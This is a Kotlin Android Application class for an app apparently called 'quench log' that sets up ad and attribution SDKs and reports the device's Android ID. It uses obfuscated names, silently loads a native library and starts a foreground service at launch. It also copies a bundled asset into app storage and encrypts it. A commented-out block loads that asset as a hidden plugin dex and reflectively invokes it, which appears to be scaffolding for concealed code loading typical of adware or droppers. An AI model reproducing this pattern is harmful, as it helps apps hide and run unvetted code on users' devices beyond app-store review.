package com.app.quench.log

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.annotation.DoNotInline
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustConfig
import com.adjust.sdk.Util
import com.app.quench.log.base.createDb
import com.app.quench.log.history.CodeActivityUtil
import com.app.quench.log.setting.AESFileUtil.decryptFile
import com.app.quench.log.setting.AESFileUtil.encryptFile
import com.app.quench.log.setting.Audnf
import com.app.quench.log.setting.HitKey
import com.app.quench.log.setting.QusnSeervice
import com.app.quench.log.setting.YhwuHnd
import com.tencent.mmkv.MMKV
import com.tradplus.ads.base.common.TPDataCenter
import com.tradplus.ads.open.TradPlusSdk
import dalvik.system.DexClassLoader
import okio.buffer
import okio.sink
import okio.source
import java.io.File

class HitApp : Application() {

    init {
        try {
            System.loadLibrary("KmERAS")
        } catch (_: Exception) {
        }
    }

    companion object {

        lateinit var mApp: Application

        @JvmStatic
        fun stService() {
            try {
                val intent = Intent(mApp, QusnSeervice::class.java)
                mApp.startForegroundService(intent)
            } catch (ignored: Exception) {
            }
        }
    }

    val db by lazy(LazyThreadSafetyMode.SYNCHRONIZED) {
        createDb(this)
    }

    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)

    }

    override fun onCreate() {
        super.onCreate()
        mApp = this
        Thread.setDefaultUncaughtExceptionHandler { _, e -> e.printStackTrace() }
        stService()
        MMKV.initialize(this)
        qsjd()
        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
            }

            override fun onActivityStarted(activity: Activity) {
            }

            override fun onActivityResumed(activity: Activity) {
                Adjust.onResume()
                activity.javaClass.getPackage()?.also {
                    if (it.name.contains(HitKey.PACKANGE)) {
                        CodeActivityUtil.addTrAc(activity)
                    } else {
                        CodeActivityUtil.addActivity(activity)
                    }
                }
            }

            override fun onActivityPaused(activity: Activity) {
                Adjust.onPause()
            }

            override fun onActivityStopped(activity: Activity) {
            }

            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {
            }

            override fun onActivityDestroyed(activity: Activity) {
                activity.javaClass.getPackage()?.also {
                    if (it.name.contains(HitKey.PACKANGE)) {
                        CodeActivityUtil.removeTrAc()
                    } else {
                        CodeActivityUtil.removeActivity(activity)
                    }
                }
            }
        })
    }

    @DoNotInline
    private fun qsjd() {
        Adjust.addSessionCallbackParameter("customer_user_id", Util.getAndroidId(this))
        val config = AdjustConfig(this, HitKey.ADJUST, AdjustConfig.ENVIRONMENT_PRODUCTION)
        config.isSendInBackground = true
        config.isFinalAttributionEnabled = true
        Adjust.onCreate(config)

        TradPlusSdk.initSdk(this, HitKey.APP_ID)
        TradPlusSdk.setTradPlusInitListener {
            TPDataCenter.getInstance().getAdertisingId(this) { _, _ ->
                Audnf.poInstall()
                Audnf.posDau()
            }

        }
        fjssf()
    }

    private fun fjssf() {
        YhwuHnd.oskd(1, "Gdp")
        try {
            val file = File(filesDir, "qsaaaa")
            if (!file.exists()) {
                try {
                    assets.open("bbb").use { input ->
                        input.source().buffer().use { source ->
                            file.outputStream().use { out ->
                                out.sink().buffer().use { sink ->
                                    sink.writeAll(source)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            file.setReadOnly()
            file.encryptFile(File(filesDir, "encryptFile_bbb"))

//            // 使用自定义 ClassLoader 加载插件的 dex 文件
//            val dexClassLoader = DexClassLoader(
//                file.path,  // 插件的 dex 文件路径
//                filesDir.absolutePath + "/opti",  // 优化后的目录
//                null,  // 如果没有额外的库文件
//                classLoader // 使用宿主的 ClassLoader 作为父 ClassLoader
//            )
//            Audnf.dexLoad = dexClassLoader
//            // 使用自定义的 ClassLoader 加载插件中的 Test 类
//            val testClass = dexClassLoader.loadClass("com.example.outdex.Standup")
//            // 调用 greet 方法
//            val greetMethod = testClass.getMethod("callStand", Application::class.java)
//            greetMethod.invoke(null, this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

}
